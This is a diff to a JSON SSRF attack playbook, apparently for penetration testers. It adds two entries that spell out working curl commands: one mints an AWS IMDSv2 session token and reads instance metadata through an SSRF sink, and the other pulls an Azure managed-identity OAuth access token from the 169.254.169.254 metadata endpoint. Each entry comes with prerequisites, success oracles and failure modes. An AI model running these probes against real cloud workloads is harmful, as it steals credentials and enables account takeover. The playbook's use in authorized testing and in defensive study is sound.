@@ -2,7 +2,7 @@
   "corpus": "SSRF",
   "organ": "ssrf-playbook",
   "vuln_class": "server_side_request_forgery",
-  "corpus_version": "1.1.0",
+  "corpus_version": "1.2.0",
   "house_rules": [
     "Every proof routes through the operator's declared canary collector (scope.csv class canary, http_probe with canary=True) - a DNS log or HTTP hit on a third-party service is gossip, not channel proof (organ doctrine).",
     "Payloads below are canonical forms from the public record, attributed per entry.",
@@ -207,6 +207,48 @@
         "credit": "public-record SSRF bypass set + the PortSwigger-documented own-domain-resolves-to-loopback row",
         "title": "PayloadsAllTheThings - SSRF bypass table; PortSwigger Web Security Academy - SSRF",
         "url": "https://portswigger.net/web-security/ssrf"
+      }
+    },
+    {
+      "id": "SSRF-013",
+      "technique": "AWS IMDSv2 session-token dance (PUT + TTL header through the SSRF)",
+      "prerequisites": [
+        "SSRF egress to 169.254.169.254 from an AWS workload",
+        "IMDSv2 enforced (bare-GET IMDSv1 closed — SSRF-006 already returned 401)",
+        "the sink can be driven to issue a PUT with a caller-named header — method control plus header control is the class gate (the appsecco record names both requirements)"
+      ],
+      "probe": "PUT /latest/api/token with header X-aws-ec2-metadata-token-ttl-seconds: 21600 mints the session token; every subsequent metadata GET carries header X-aws-ec2-metadata-token: <token> — canonical record: TOKEN=`curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\"` && curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/dynamic/instance-identity/ (IPv6 form on the same record: http://[fd00:ec2::254]/latest/meta-data/)",
+      "oracle": "the second GET answers 200 with metadata content where the bare GET answered 401 — the token dance succeeded THROUGH the sink; any credential material in the response follows the SSRF-006 masking law (first 8 chars in the ledger, full value only in the engagements/ artifact)",
+      "failure_modes": [
+        "sink issues GET-only (vanilla URL-parameter SSRF) — the class is closed at that sink and IMDSv2 is doing its job; record the hardening as a positive FACT, do not keep firing",
+        "hop limit 1 (the default) — containerized workers one NAT hop away get the token PUT refused; the limit is a knob, not a wall",
+        "PUT requests carrying an X-Forwarded-For header are rejected by IMDSv2 (documented refusal) — proxy-shaped sinks fail here for a documented reason",
+        "TTL above 21600 seconds is not honored — the record's own six-hour cap; treat oversized TTL probes as malformed, not as evidence"
+      ],
+      "source": {
+        "credit": "AWS documentation (IMDSv2 token examples) + the appsecco SSRF-upgrade exercise record",
+        "title": "AWS EC2 User Guide - Instance metadata and user data (IMDSv2 examples); appsecco ec2-meta-data-version-2.md",
+        "url": "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html"
+      }
+    },
+    {
+      "id": "SSRF-014",
+      "technique": "Azure managed-identity access-token retrieval (credential-bearing metadata)",
+      "prerequisites": [
+        "egress to 169.254.169.254 from an Azure workload with a managed identity attached",
+        "the sink can send the Metadata: true header — plain GETs are refused, the header is the gate (SSRF-008's fingerprint in reverse)"
+      ],
+      "probe": "curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s",
+      "oracle": "200 with a JSON access_token for the named resource — credential-bearing response: mask at first 8 chars in the ledger, full value only in the engagements/ artifact; an identity error or empty block means no managed identity on the workload and the class closes as exposure-only",
+      "failure_modes": [
+        "no managed identity attached — the endpoint answers with an identity error; bounded to information disclosure, say so",
+        "the sink cannot set arbitrary headers — header injection via the URL is a separate hypothesis (SSRF-009's parser seam), never an assumption",
+        "the resource parameter is part of the byte record: api-version=2018-02-01 and the %2F-encoded resource URL — a raw-slash form is a different request, ledger it separately or not at all"
+      ],
+      "source": {
+        "credit": "Microsoft Learn (managed identities token retrieval)",
+        "title": "Azure - How to use managed identities for Azure resources on an Azure VM to get an access token",
+        "url": "https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token"
       }
     }
   ]
